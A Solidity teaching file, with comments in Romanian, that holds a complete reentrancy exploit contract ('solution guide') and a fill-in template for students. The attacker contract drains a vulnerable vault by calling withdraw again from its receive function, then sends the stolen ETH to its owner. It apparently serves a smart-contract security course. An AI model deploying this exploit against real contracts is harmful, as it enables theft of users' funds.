// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * @title VaultAttacker
 * @notice Contract de ATTACK pentru exploatarea vulnerabilității de Reentrancy
 * @dev Acest contract demonstrează cum funcționează un atac de tip Reentrancy
 * 
 * Acest fișier este SOLUTION GUIDE - studenții trebuie să îl completeze
 */

interface ISimpleVault {
    function deposit() external payable;
    function withdraw(uint256 _amount) external;
    function withdrawAll() external;
    function getBalance() external view returns (uint256);
}

contract VaultAttacker {
    ISimpleVault public vault;
    address public owner;
    uint256 public withdrawAmount;
    
    // Counter pentru a limita recursivitatea (previne out of gas)
    uint256 public attackCount;
    uint256 public maxAttacks = 5;
    
    event AttackStarted(uint256 initialDeposit);
    event AttackCompleted(uint256 stolenAmount);
    event ReentrancyTriggered(uint256 count);
    
    constructor(address _vaultAddress) {
        vault = ISimpleVault(_vaultAddress);
        owner = msg.sender;
    }
    
    modifier onlyOwner() {
        require(msg.sender == owner, "Only owner can call this");
        _;
    }
    
    /**
     * @notice Pasul 1: Depunem ETH în vault
     * @dev Trebuie să avem o balanță în vault pentru a putea retrage
     */
    function depositToVault() public payable onlyOwner {
        require(msg.value > 0, "Must send ETH to deposit");
        withdrawAmount = msg.value;
        
        vault.deposit{value: msg.value}();
        
        emit AttackStarted(msg.value);
    }
    
    /**
     * @notice Pasul 2: Începem atacul de reentrancy
     * @dev Apelăm withdraw() care va declanșa fallback-ul nostru
     */
    function attack() public onlyOwner {
        require(withdrawAmount > 0, "Must deposit first");
        
        attackCount = 0;
        
        // Începem atacul apelând withdraw
        vault.withdraw(withdrawAmount);
        
        emit AttackCompleted(address(this).balance);
    }
    
    /**
     * @notice Fallback function - se execută când primim ETH
     * @dev Aici se întâmplă MAGIA reentrancy-ului
     * 
     * Flow-ul atacului:
     * 1. Apelăm vault.withdraw()
     * 2. Vault-ul ne trimite ETH → se execută această funcție
     * 3. Apelăm DIN NOU vault.withdraw() ÎNAINTE ca vault-ul să ne actualizeze balanța
     * 4. Repetăm până drenăm vault-ul sau rămânem fără gas
     */
    receive() external payable {
        attackCount++;
        
        emit ReentrancyTriggered(attackCount);
        
        // Verificăm dacă mai sunt fonduri în vault și dacă nu am depășit limita
        if (address(vault).balance >= withdrawAmount && attackCount < maxAttacks) {
            // ⚠️ ATACUL DE REENTRANCY: Apelăm DIN NOU withdraw()
            // Vault-ul nu ne-a actualizat încă balanța, deci verificarea va trece!
            vault.withdraw(withdrawAmount);
        }
    }
    
    /**
     * @notice Fallback pentru orice alt apel
     */
    fallback() external payable {
        // Redirect către receive()
    }
    
    /**
     * @notice Extragem fondurile furate către owner
     */
    function extractStolenFunds() public onlyOwner {
        uint256 balance = address(this).balance;
        require(balance > 0, "No funds to extract");
        
        (bool success, ) = owner.call{value: balance}("");
        require(success, "Transfer failed");
    }
    
    /**
     * @notice Verifică balanța atacatorului în vault
     */
    function getBalanceInVault() public view returns (uint256) {
        return vault.getBalance();
    }
    
    /**
     * @notice Verifică câți ETH am furat
     */
    function getStolenAmount() public view returns (uint256) {
        return address(this).balance;
    }
    
    /**
     * @notice Setează numărul maxim de atacuri recursive
     */
    function setMaxAttacks(uint256 _max) public onlyOwner {
        maxAttacks = _max;
    }
}


/**
 * @title VaultAttackerTemplate
 * @notice Template pentru studenți - trebuie să completeze codul
 * @dev Studenții trebuie să implementeze logica de attack
 */
contract VaultAttackerTemplate {
    ISimpleVault public vault;
    address public owner;
    uint256 public withdrawAmount;
    
    constructor(address _vaultAddress) {
        vault = ISimpleVault(_vaultAddress);
        owner = msg.sender;
    }
    
    modifier onlyOwner() {
        require(msg.sender == owner, "Only owner");
        _;
    }
    
    /**
     * TODO: Implementează funcția de depunere
     * HINT: Trebuie să folosești vault.deposit{value: msg.value}()
     */
    function depositToVault() public payable onlyOwner {
        // TODO: Completează codul aici
        // 1. Verifică că msg.value > 0
        // 2. Salvează msg.value în withdrawAmount
        // 3. Apelează vault.deposit() cu ETH-ul primit
    }
    
    /**
     * TODO: Implementează funcția de attack
     * HINT: Apelează vault.withdraw(withdrawAmount)
     */
    function attack() public onlyOwner {
        // TODO: Completează codul aici
        // 1. Verifică că ai depus mai întâi (withdrawAmount > 0)
        // 2. Apelează vault.withdraw()
    }
    
    /**
     * TODO: Implementează receive() function
     * Aceasta este CHEIA atacului de reentrancy!
     * 
     * HINT: Când primești ETH, verifică dacă mai sunt fonduri în vault
     * și apelează DIN NOU vault.withdraw()
     */
    receive() external payable {
        // TODO: Completează codul aici
        // 1. Verifică dacă vault mai are fonduri (address(vault).balance >= withdrawAmount)
        // 2. Dacă da, apelează DIN NOU vault.withdraw(withdrawAmount)
        // 3. BONUS: Adaugă o condiție de oprire pentru a nu rămâne fără gas
    }
    
    /**
     * TODO: Implementează funcția de extragere a fondurilor
     */
    function extractStolenFunds() public onlyOwner {
        // TODO: Completează codul aici
        // 1. Obține balanța contractului (address(this).balance)
        // 2. Trimite-o către owner folosind call
    }
    
    // Helper functions - COMPLETATE pentru tine
    function getStolenAmount() public view returns (uint256) {
        return address(this).balance;
    }
    
    function getBalanceInVault() public view returns (uint256) {
        return vault.getBalance();
    }
}
